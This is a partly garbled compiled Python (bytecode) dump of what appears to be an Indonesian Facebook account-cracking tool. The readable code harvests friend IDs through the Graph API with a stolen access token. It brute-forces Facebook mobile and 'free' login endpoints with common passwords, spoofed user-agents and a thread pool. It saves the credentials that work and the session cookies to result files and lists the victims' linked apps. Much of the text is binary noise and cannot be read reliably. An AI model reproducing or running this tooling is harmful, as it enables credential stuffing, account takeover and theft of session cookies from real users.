� r�   )r[   r	   rZ   rv   rA   rB   r3   r�   rR   r�   rD   rO   r�   r:   r�   r�   ru   rV   r}   �replace�cek_opsir\   r7   )Ztek�teksZmy_filesZlisZktZmerZtyZyyr�   r�   r�   r�   r�   �teks2r�   r�   r�   ZhfZfzr�   r5   r5   r6   r�   a  s�   

�
�
�.2
�
��r�   c            
   	   C   s�  z	t dd��� } W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d � ttd t d	 t d
 �}zFt	�
d| d td
  ��� }|d d D ]}zt
�|d d |d  � W qV   Y qVttd t d t d ttt
�� � t�  W d S  t	jjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}t|dd�}	t� �|	� t�  Y d S w )NrI   rJ   z# CRACK PUBLIC IDrM   rN   rc   r�   z
] CRACK FBrd   z] FACEBOOK ID : � https://graph.facebook.com/v2.0/�)?fields=friends.limit(5000)&access_token=r   �friendsr~   rG   r�   rE   z
] Total : rL   z*# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK)rO   rP   r\   rD   rZ   r[   r	   rv   ru   r>   r?   rQ   rS   rG   rR   r:   r�   �settingrX   rY   rV   )
r]   �winZwin2r|   Zkoh2Zpir^   r_   r�   r�   r5   r5   r6   r�   �  s8   
� 
(�r�   c               
   C   s�  d} t | dd�}tt |dd�� td�}|dv r<td�}t|d	��� �� }d
}|D ]}t�|� |d
7 }|dkr: nq)n�|dv r�tt	d
 t	 d t	 d � zt
tt	d
 t	 d t	 d ��}W n tyz   d}t|dd�}	t
� �|	� t�  Y nw |d
k s�|dkr�d}t|dd�}	t
� �|	� t�  t�� }
d}ttd
 t	 d t d � t|�D ]!}|d
7 }tt	d
 t	 t|� t	 d t|� d �}
t�|
� q�d}t
� �t|dd�� t�� }
tD ]b}z6|
�d| d td  ��� }|d d D ]}z|d d |d   }|tv �rnt�|� W q�   Y q�W q� ttf�y$   Y q� tjj�yB   d!}t|dd�}t
� j|dd� t�  Y q�w d"tt� }tt�dk�rWt|dd�}nt|dd�}t
� �|� t�  d S )#NzC[bold green][01] CRACK FROM FILE
[02] CRACK ID (MULTI)[/bold green]rM   rN   ZMENUr`   u   [➣] MENU: rb   u   [➣] FILE NAME : rJ   r   �   rf   rc   r�   z] TOTAL LIMIT IDS [20]rd   z] BERAPA ID : z# ID TIDAK DI TEMUKANz# OUT OF RANGE MENr   r�   z*] Ketik "me" Jika Ingin Dump ID Dari Temanz] ENTER ID z : z!# Tunggu Sedang Mengumpulkan ID  r�   r�   r�   r~   rG   r�   rE   rL   z# TOTAL  %s ID, BISMILLAH HOKI)rs   rt   ru   rO   rP   r�   �uidrR   r	   rv   �int�
ValueErrorrZ   r[   rD   r>   �Sessionr�   r�   r:   r?   rQ   rS   rG   rV   r\   rX   rY   r�   r�   )ZmasZmas2ZpilihZnmfilZnmfile�noZxfilZjumZpesanZpesan2�sesZyz�met�klZsedZuserr�col�miZisor^   r_   ZtotZtot2r5   r5   r6   r�   �  s�   
��$
�,
�
�
�
r�   c                  C   sR  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d t d	 �}|d
v r;tt�D ]}t	�
|� q2nT|dv rhg }tt�D ]}|�
|� qEt|�}|d }t|�D ]
}	t	�
|| � |d8 }qYn'|d
v r�tD ]}t
�dtt	��}
t	�|
|� qnnd}t � �t|dd�� t�  d}t � �t|dd�� d}
t|
dd�}tt|dd�� ttd t d t d �}|d
v r�t�
d� n|dv r�t�
d� n|d
v r�t�
d� nt�
d� d}t � �t|dd�� ttd t d t d �}|dv �rt�
d� nt�
d� ttd t d t d �}|dv �rt�
d� nt�
d� t�  d S )Nu   # METHOD ✓rM   rN   zg[bold green][01] CRACK OLD ID (MANTAP)
[02] CRACK NEW ID (OKE)
[03] CRACK RANDOM ID (WORK)[/bold green]u   MENU ✓r`   rc   rd   u   ] METHOD ✓: rb   rf   r   r�   r   r�   zM[bold green][01]M-FACEBOOK
[02]FREE-FACEBOOK
[03]MBASIC-FACEBOOK[/bold green]u
   METHOD ✓r�   �mobile�freeZmbasicz# PILIHAN OPSI CRACK z]Tampilkan Opsi Apk ? (y/t) : ��y�Y�yar�   z0] SHOW C/P OPTIONS? [ Not Recommended ] (y/t) : )r[   r	   rZ   rs   rt   ru   rv   �sortedrG   �id2rR   r�   r�   �randomZrandint�insertrD   �method�	taplikasi�oprek�passwrd)Zwlr�   Ztak�huZtuaZmudaZbacotZbcmZbcmiZxmudZxxr�   r�   ZiozZgessZhcZguwZaplikZoskr5   r5   r6   r�   �  sh   �
��





r�   c            
      C   s�  d} t � �t| dd�� dttf }tt|dd�� tdd���}tD ]�}|�	d	�d
 |�	d	�d �
� }}|�	d�d
 }g d
�}t|�dk r\t|�dk rMn.|�|d � |�|d � nt|�dk rh|�|� n|�|� |�|d � |�|d � dt
v r�|�t||� q"dt
v r�|�t||� q"dt
v r�|�t||� q"|�t||� q"W d   � n1 s�w   Y  td� d}t � �t|dd�� ttd t d t d �}	|	dv r�t�  d S t�  d S )Nz# CRACKING rM   rN   zlHasil Live  Disimpan Ke : OK/%s
Hasil Check Disimpan Ke : CP/%s
Hidupkan/Matikan Mode Pesawat Setiap 5 MenitZCLONEr`   �   )Zmax_workersr�   r   r   r�   )Z	123456789ZsayangZkontolZ123456ZsayangkuZanjingZallhamdullilah�   �   Z123Z12345r�   r�   Ztouchr�   z# CHECK RESULTS OPTIONS?rc   rd   z] SHOW CRACK RESULTS? (y/t) : r�   )r[   r	   rZ   �okc�cpcrt   rs   �tredr�   r�   �lowerr�   rR   r�   �submit�crack�	crackfreeZ
cracktouchru   rv   r�   rD   )
ZlerZkrekZpoolZyuzong�idfZnmfZfrs�pwvZtanyaZwoir5   r5   r6   r�   4  sF   "
��

r�   c                 C   sV  t �tg�}td tt� }d}td|ttt�ttt	|�t
|�tf dd� tj
��  t �t�}t �t�}t �t�}t�� }|D �]�}	�z�|j�dd|ddd	d
ddd
dddd�
� |�d|  d �j}
t�dt
|
���d�t�dt
|
���d�| d|	dd�}|j�ddddd|dd	d
ddd
d|  d ddd�� |jd|d d!�}d"|j�� �� v r�d#tv r�t �!| d$ |	 � t"| |	� n,td%t#� d&| � d$|	� t$� �� t%d't& d(��'| d$ |	 d) � t �!| d$ |	 � td7 aW  �n9d*|j�� �� v �rd+d,i}
d-t(v �rDtd7 a|j�� }d.�)d/d0� |j�� �*� D ��}td%t+� d1| � d$|	� d$t+� |� �	� t%d2t, d(��'| d$ |	 d$ | d$ | d) � W  n�d#t(v �rtd7 a|j�� }d.�)d3d0� |j�� �*� D ��}t%d2t, d(��'| d$ |	 d$ | d$ | d) � | }d4}t�� }|jd5||
d6�j}|jd7||
d6�j}|d87 }t�-d9t
|��}d:\}}t�-d;t
|��}|D ]}|d7 }|d<|� d=|� d|| � d>�7 }�q�d:\}}|d?7 }t�-d@t
|��}t�-d;t
|��}|D ]}|d7 }|d<|� d=|� d|| � d>�7 }�q�tdAt+� dB| � dC|	� d$|� d$|� t$� �� W  nnW q@W q@ tj.j/�y$   t0�1dD� Y q@w td7 ad S )ENr�   �%�3   
%s➣ %s/%s ➣👉-OK:%s ➣👉-CP:%s ➣ %s%s%sr�   ��endzm.facebook.comr   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�documentzhttps://m.facebook.com/�gzip, deflate brz5en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5�
�Hostrk   r   rn   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destri   �accept-encodingrl   z8https://m.facebook.com/login/device-based/password/?uid=z6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�login_no_pinz*https://m.facebook.com/login/save-device/'�Zlsd�jazoestr�   Zflow�pass�nextrh   zhttps://m.facebook.com�!application/x-www-form-urlencodedz7https:/m.facebook.com/login/device-based/password/?uid=�r�   rm   rk   rj   ro   r   rn   r�   r�   r�   r�   r�   ri   r�   rl   zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDF�r~   �allow_redirects�
checkpointr�   r�   �
  �   CP😭  r�   �ar�   �c_userr   ��SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�   �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr5   ��.0�key�valuer5   r5   r6   �
<listcomp>|  �    zcrack.<locals>.<listcomp>�   OK🥷 r�   c                 S   r  r  r5   r	  r5   r5   r6   r
  �  r  r�   �@https://free.facebook.com.com/settings/apps/tabbed/?tab=inactive�rr   rq   �>https://free.facebook.com.com/settings/apps/tabbed/?tab=activeu.   
[bold green][•]Active Apps :[/bold green] 
�n\/>\<div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�r   r   �2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�
[bold green][r�   �[/bold green]
�5   [bold green][•] Expired Application :[/bold green]
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�
   u   OK ✓ �[][]�   )2r�   �choicerv   �loopr�   r�   r	   �ok�cpr�   r:   r�   rC   �stdout�flush�ugen�ugen2�ugen3r>   r�   rq   r�   r?   r@   rx   ry   rz   �postrr   �get_dict�keysr�   r}   rR   �ceker�M�NrO   r�   rw   r�   r=   �items�Hr�   �findallrX   rY   rA   rB   )r�   r�   �bi�pers�fff�ua�ua2Zua3r�   �pw�p�dataa�po�headapp�coki�kuki�user�infoakun�session�cek2r�   �apkAktif�hit1�hit2�apkaktip�muncul�
apkKadaluarsa�
kadaluarsar5   r5   r6   r�   \  s�   6



(64 

$0

0$$*�� �r�   c                 C   sR  t �tg�}td tt� }d}td|ttt�ttt	|�t
|�tf dd� tj
��  t �t�}t �t�}t�� }|D �]�}�z�t�� }	|j�dd|ddd	d
ddd
dddd�
� |�d|  d �j}
t�dt
|
���d�t�dt
|
���d�| d|dd�}|j�ddddd|dd	d
ddd
d|  d ddd�� |jd|dd �}d!|j�� �� v r�d"tv r�t �!| d# | � t"| |� n,td$t#� d%| � d#|� t$� �� t%d&t& d'��'| d# | d( � t �!| d# | � td7 aW  �n8d)|j�� �� v �rd*d+i}
d,t(v �rCtd7 a|j�� }d-�)d.d/� |j�� �*� D ��}td0t+� d1| � d#|� d#t+� |� �	� t%d2t, d'��'| d# | d# | d# | d( � W  n�d"t(v �r
td7 a|j�� }d-�)d3d/� |j�� �*� D ��}t%d2t, d'��'| d# | d# | d# | d( � | }d4}t�� }|jd5||
d6�j}|jd7||
d6�j}|d87 }t�-d9t
|��}d:\}}t�-d;t
|��}|D ]}|d7 }|d<|� d=|� d|| � d>�7 }�q�d:\}}|d?7 }t�-d@t
|��}t�-d;t
|��}|D ]}|d7 }|d<|� d=|� d|| � d>�7 }�q�td0t+� d1| � d#|� d#t+� |� |� �
� W  nnW q;W q; tj.j/�y"   t�0dA� Y q;w td7 ad S )BNr�   r�   r�   r�   r�   �free.facebook.com.comr   r�   r�   r�   r�   r�   r�   �https://free.facebook.com.com/r�   �en-GB,en-US;q=0.9,en;q=0.8r�   �?https://free.facebook.com.com/login/device-based/password/?uid=�)&flow=login_no_pin&refsrc=deprecated&_rdrr�   r   r�   r�   �1https://free.facebook.com.com/login/save-device/'r�   rh   r.   r�   r�   �Jhttps://free.facebook.com.com/login/device-based/validate-password/?shbl=0Fr�   r   r�   r�   r  r  r�   r  r�   r  r   r  r�   r  c                 S   r  r  r5   r	  r5   r5   r6   r
  �  r  zcrackfree.<locals>.<listcomp>r  r  r�   c                 S   r  r  r5   r	  r5   r5   r6   r
  �  r  r�   r  r  r  u#   
[green][•] Active Apps[/green] 
r  r  r  r  r�   r  u4   [bold green][•] Expired Application:[/bold green]
r  r  )1r�   r  rv   r  r�   rG   r	   r  r   r�   r:   r�   rC   r!  r"  r#  r$  r>   r�   rA   rq   r�   r?   r@   rx   ry   rz   r&  rr   r'  r(  r�   r}   rR   r)  r*  r+  rO   r�   rw   r�   r=   r,  r-  r�   r.  rX   rY   rB   )r�   r�   r/  r0  r1  r2  r3  r�   r4  Ztixr5  r6  r7  r8  r9  r:  r;  r<  r=  r>  r�   r?  r@  rA  rB  rC  rD  rE  r5   r5   r6   r�   �  s�   6


(64 

$0

0$$(�� �r�   c                 C   sL  t �tg�}td tt� }d}td|ttt�ttt	|�t
|�tf dd� tj
��  t �t�}t �t�}t�� }|D �]�}�z�|j�dd|ddd	d
ddd
dddd�
� |�d|  d �j}	t�dt
|	���d�t�dt
|	���d�| d|dd�}
|j�ddddd|dd	d
ddd
d|  d ddd�� |jd|
d d!�}d"|j�� �� v r�d#tv r�t� | d$ | � t!| |� n,td%t"� d&| � d'|� t#� �� t$d(t% d)��&| d$ | d* � t'� | d$ | � td7 aW  �n9d+|j�� �� v �rd,d-i}d.t(v �r?td7 a|j�� }
d/�)d0d1� |j�� �*� D ��}td2t+� d3| � d$|� d$t+� |� �	� t$d4t, d)��&| d$ | d$ | d$ | d* � W  n�d#t(v �r
td7 a|j�� }
d/�)d5d1� |j�� �*� D ��}t$d4t, d)��&| d$ | d$ | d$ | d* � | }d6}t�� }|jd7|
|d8�j}|jd9|
|d8�j}|d:7 }t�-d;t
|��}d<\}}t�-d=t
|��}|D ]}|d7 }|d>|� d?|� d|| � d@�7 }�q�d<\}}|dA7 }t�-dBt
|��}t�-d=t
|��}|D ]}|d7 }|d>|� d?|� d|| � d@�7 }�q�td%t+� dC| � d'|� d$|� d$|� t#� �� W  nnW q;W q; tj.j/�y   t0�1dD� Y q;w td7 ad S )ENr�   r�   r�   r�   r�   rF  r   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   r�   r�   r�   rG  r�   rH  r�   rI  rJ  r�   r   r�   r�   rK  r�   rh   r.   r�   r�   r�   rL  Fr�   r   r�   r�   r  u   CP😭 r  r�   r  r�   r  r   r  r�   r  c                 S   r  r  r5   r	  r5   r5   r6   r
    r  zcrackmbasic.<locals>.<listcomp>r  r  r�   c                 S   r  r  r5   r	  r5   r5   r6   r
    r  r�   r  r  r  u!   
[green][•] Active Apps :[/H] 
r  r  r  r  r�   r  r  r  u   OK ✓  r  )2r�   r  rv   r  r�   rG   r	   r  r   r�   r:   r�   rC   r!  r"  r#  r$  r>   r�   rq   r�   r?   r@   rx   ry   rz   r&  rr   r'  r(  r�   r}   rR   r)  r*  r+  rO   r�   rw   Zlakunr�   r=   r,  r-  r�   r.  rX   rY   rA   rB   )r�   r�   r/  r0  r1  r2  r3  r�   r4  r5  r6  r7  r8  r9  r:  r;  r<  r=  r>  r�   r?  r@  rA  rB  rC  rD  rE  r5   r5   r6   �crackmbasic�  s�   6


(64 

$0

0$$*�� �rM  c                 C   s�  d}ddddd|ddd	d
ddd
ddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt
 d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}
t	d't|
jtf � q�W d S  ty� } z-t	d(t
| |tf � t	d)ttf � tdt
 d ��| d! | d" � td#7 aW Y d }~d S d }~ww )*Nr  rF  rh   r   r.   r�   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   �navigate�?1r�   �<https://free.facebook.com.com/login/?next&ref=dbl&fl&refid=8r�   rg   r�   �'https://free.facebook.com.com/login.phpr�   �Zemailr�   r/   T�r~   rq   r�   �html.parser�form�Znhr�   Zfb_dtsgzsubmit[Continue]Zcheckpoint_dataru   rE   r  �action�r~   rq   �   
%s++++ %s|%s CP ✓        %sr�   r  r�   r�   r   �optionr   �2
%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�
%s---> %s%su   
%s++++ %s|%s CP ✓      %sz>
%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)r>   r�   r?   �sopr&  r@   �findr�   r:   r	   �br�   rO   r�   rw   r   �find_allr�   �hh�kkr{   �u)r�   r4  r2  �headr�   �hi�ho�jor~   �lion�anj�kent�opsi�opsii�cr5   r5   r6   r)  7  s<   $
"
�$ 
� ��r)  c                  C   s$  t t�} dt }tt|dd�� ttd t d t d � d}t� �	t
|dd	�� d
}tD �]Q}�z/z|�d�d
 |�d�d }}W n  tyd   t
�d
� t	dt|tf � t	dttf � Y W q.w t�ttttttg�}t	d||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j� � �!� v �r=zi|�"d*�}
i }g d+�}|
d,�D ]}|�d-�|v r�|�#|�d-�|�d.�i� q�t|	jdt$|
d/ � ||
d0�jd(�}t	d1t||tf � |�%d2�}t |�d
k�rt	d3ttf � n|D ]
}t	d4t|jtf � �qW n6   t	d5t||tf � t	d6ttf � Y nd7|	j� � �!� v �rRt	d8t||tf � n
t	d9t||tf � |d7 }W q. tj&j'�y�   t	d:� d;}t� �	t
|dd	�� t(�  Y q.w d<}t� �	t
|dd	�� t(�  d S )=Nz$TURN ON %s AIRPLANE MODE 8 SECONDS 
zCEK OPSIr`   rc   r�   z] Mulaiz# OPTION CHECK PROCESS STARTrM   rN   r   r�   r   r�   z
%s++++ %s ----> Error      %sz2
%s---> Pemisah Tidak Didukung Untuk Program Ini%sz
%s---> %s/%s ---> { %s }%sr�   r�   z�Mozilla/5.0 (Linux; U; Android 4.1.2; en-nl; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30rF  rh   r   r.   r�   rN  r�   r�   rO  rP  r�   rQ  r�   rg   r�   rR  r�   rS  TrT  rU  r   rV  rW  ru   rE   r  rX  rY  rZ  r[  r\  r]  u"   
%s++++ %s|%s HACK-CP ✓       %sz#
%s---> Tidak Dapat Mengecek Opsi%sr  u    
%s++++ %s|%s HACK-OK ✓     %sz!
%s++++ %s|%s ---> SALAH       %sr�   rL   z# DONE))r�   r}   r  rt   rs   ru   r�   rv   r[   r	   rZ   r�   �
IndexErrorrA   rB   r`  rd  r�   r  �krc  rb  rC   r!  r"  r>   r�   r?   r^  r&  r@   rr   r'  r(  r_  r�   r:   ra  rX   rY   rD   )rn  r�   r�   ZloveZkesrG   r4  r/  r2  r�   �headerrf  rg  rh  r~   ri  rj  rk  rl  rm  r^   Zdahr5   r5   r6   r�   U  sr   
"
�($
"
�$
�
�
r�   r9   r�   r�   ){r>   Zbs4rS   r3   rC   r�   ZdatetimerA   rx   �
subprocessZrich�ImportErrorr4   rB   rD   Z
rich.tabler   �meZrich.consoler   r[   r   r^  Zconcurrent.futuresr   r�   r   ZgpZ
rich.panelr   rs   �base64r	   rt   Z
rich.markdownr
   rZ   Zrich.columnsr   r�   r%  r$  r#  rG   r�   r  r  r   r}   r�   r�   Z	lisensikur�   rQ   r�   Zlisensikunir-  r*  �K�T�U�B�P�Cr+  r�   rp  rv   rb  rd  rc  r`  r5  Zheader_grupZdicr�   Z
url_lookupZurl_mbZurl_ipZ	url_graphZaedxZssssZddddZaaaaZbbbbZawssZcuiiZmmkkZccccZuvgoZhhhhZbahasar2  ZnowZdayZtglr:   ZmonthZblnZyearZthnr�   r�   r2   r7   r8   rF   r/   rW   rU   r�   r�   r�   r�   r�   r�   r�   r�   rM  r)  r�   �__name__�mkdirr5   r5   r5   r6   �<module>   s�   P

���8
((3+}@?8(IJH
;
�
